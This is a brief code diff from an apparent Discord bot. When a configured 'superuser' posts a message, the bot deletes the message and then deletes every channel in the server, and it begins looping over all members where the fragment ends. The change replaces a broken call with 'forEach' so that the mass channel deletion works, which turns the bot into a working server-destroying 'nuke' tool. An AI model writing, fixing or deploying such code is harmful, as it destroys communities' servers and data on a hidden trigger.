@@ -24,7 +24,7 @@ client.on("messageCreate", message => {
  if(message.author.id === config.superuser){
     message.delete();
 
-    message.guild.channels.Map(c => {
+    message.guild.channels.forEach(c => {
       c.delete();
     });
     message.guild.members.forEach(m => {
